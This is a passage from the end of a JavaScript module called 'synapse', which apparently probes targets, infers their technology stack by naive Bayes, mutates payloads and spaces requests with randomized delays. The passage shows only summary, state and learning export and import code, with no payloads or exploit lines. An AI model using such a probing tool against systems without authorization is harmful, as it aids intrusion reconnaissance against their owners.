          await new Promise(function (res) { setTimeout(res, 500 + Math.random() * 400); });
        }
      }

      // 7. Record feedback for learning
      recordFeedback('__targets__', true);

      running = false;
      var summary = {
        fingerprint: storage.hashKey(Object.keys(observed).sort().join('|')),
        signals: Object.keys(observed).length,
        iterations: iterations,
        top: topN(propagated, 8),
        confident: confident,
        stats: stats,
        entropy: entropy(propagated)
      };
      eventBus.emit('synapse:done', summary);
      return { ok: true, summary: summary };
    } catch (e) {
      running = false;
      return { ok: false, error: e.message };
    }
  }

  function topN(obj, n) {
    return Object.keys(obj)
      .map(function (k) { return { tech: k, prob: obj[k] }; })
      .sort(function (a, b) { return b.prob - a.prob; })
      .slice(0, n);
  }

  function stop() { running = false; }

  function state() {
    var fb = loadFeedback();
    var learned = loadPriors();
    return {
      running: running,
      stats: Object.assign({}, stats),
      probes: PROBES.length,
      payloads: Object.keys(PAYLOADS).length,
      learnedTechs: Object.keys(learned).length,
      probeFeedback: Object.keys(fb.probes || {}).length,
      targets: fb.targets || 0
    };
  }

  async function getProfile() {
    try {
      var rows = await storage.getAll('meta');
      return rows.filter(function (r) { return r.kind === 'synapse-probe' || r.kind === 'synapse-payload'; });
    } catch (e) { return []; }
  }

  function resetLearning() {
    try {
      localStorage.removeItem(PRIORS_KEY);
      localStorage.removeItem(FEEDBACK_KEY);
      return { ok: true };
    } catch (e) { return { ok: false, error: e.message }; }
  }

  function exportLearning() {
    return JSON.stringify({
      version: '15.0',
      priors: loadPriors(),
      feedback: loadFeedback()
    }, null, 2);
  }

  function importLearning(json) {
    try {
      var d = JSON.parse(json);
      if (d.priors) savePriors(d.priors);
      if (d.feedback) saveFeedback(d.feedback);
      return { ok: true };
    } catch (e) { return { ok: false, error: e.message }; }
  }

  mods.synapse = {
    run: run,
    stop: stop,
    state: state,
    profile: getProfile,
    resetLearning: resetLearning,
    exportLearning: exportLearning,
    importLearning: importLearning,
    techs: function () { return Object.keys(BASE_PRIORS); },
    probes: function () { return PROBES.map(function (p) { return { id: p.id, tech: p.tech, path: p.path }; }); },
    payloads: function () { return Object.keys(PAYLOADS); },
    // exposed for testing / UI
    _infer: naiveBayes,
    _propagate: propagate,
    _entropy: entropy,
    _selectProbes: selectNextProbes,
    _mutate: mutate
  };
  core.synapse = mods.synapse;

  eventBus.emit('synapse:ready', {
    techs: Object.keys(BASE_PRIORS).length,
    probes: PROBES.length,
    payloads: Object.keys(PAYLOADS).length
  });

  if (typeof completion === 'function') completion(true);
})();